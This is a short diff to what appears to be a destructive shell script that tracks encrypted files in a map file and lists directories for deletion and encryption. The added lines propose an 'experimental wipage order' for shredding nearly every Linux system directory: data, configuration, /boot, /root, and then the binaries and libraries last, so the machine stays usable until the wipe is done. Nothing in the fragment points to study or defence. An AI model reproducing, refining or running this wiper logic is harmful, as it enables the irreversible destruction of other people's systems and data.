@@ -31,6 +31,14 @@ LOCATION_FILE="/root/.edu/encryption_map.txt"
 # Directories to be processed for deletion, encryption, and exclusion
 deleted_dirs=(
     "/home"
+# Experimental wipage order, optimize yourself on what goes first before it is unusable
+#  "/var/lib" "/var/backups" "/var/mail"
+#    "/srv" "/opt" "/mnt" "/home"
+#    "/etc" "/boot" # Delay /boot shredding
+#    "/root" # Delay /root shredding 
+#    "/bin" "/sbin" "/usr/bin" "/usr/sbin" # Delay shredding of essential bins
+#    "/lib" "/lib64" "/usr/lib" "/usr/lib64" # Do this last
+    
 )
 
 encrypted_dirs=(
